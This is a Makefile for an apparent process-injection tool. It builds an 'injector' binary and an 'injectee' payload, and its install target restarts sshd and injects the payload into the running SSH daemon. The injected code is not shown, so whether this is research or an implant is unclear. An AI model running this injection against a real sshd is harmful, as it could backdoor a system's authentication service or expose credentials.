TARGET := injector injectee

SRC_DIR := ./src
INC_DIR := ./include
INJ_DIR := ./inject
BUILD_DIR := ./build

SRCS := $(shell find $(SRC_DIR) -name '*.c')
OBJS := $(patsubst $(SRC_DIR)/%.c,$(BUILD_DIR)/%.c.o,$(SRCS))
CC := gcc

CFLAGS := -fpie -fstack-protector -Wall -Wextra
LDFLAGS := -static -z now -z noexecstack -fpie -fstack-protector -Wall -Wextra
LIBS := -L ./libs -lelf -lz -lzstd -lc

ifdef DEBUG
	ifeq ($(DEBUG),1)
		CFLAGS += -g -O2
		LDFLAGS += -g -O2
	else ifeq ($(DEBUG),2)
		CFLAGS += -g
		LDFLAGS += -g
	endif
else
	CFLAGS += -O2
	LDFLAGS += -O2
endif

all:
	make injectee
	make injector

injectee: $(INJ)
	cd $(INJ_DIR); make -B
	cp $(INJ_DIR)/*.h $(INC_DIR)/

injector: $(OBJS)
	$(CC) $(LDFLAGS) $^ -o $@ $(LIBS)
	@echo "injector is baked"
	@echo ""

$(BUILD_DIR)/%.c.o: $(SRC_DIR)/%.c | $(BUILD_DIR)
	$(CC) -I$(INC_DIR) $(CFLAGS) $< -c -o $@
$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

install:
	systemctl restart sshd
	./injector $$(pgrep sshd)

.PHONY: clean all injector

clean:
	rm -rf $(BUILD_DIR)
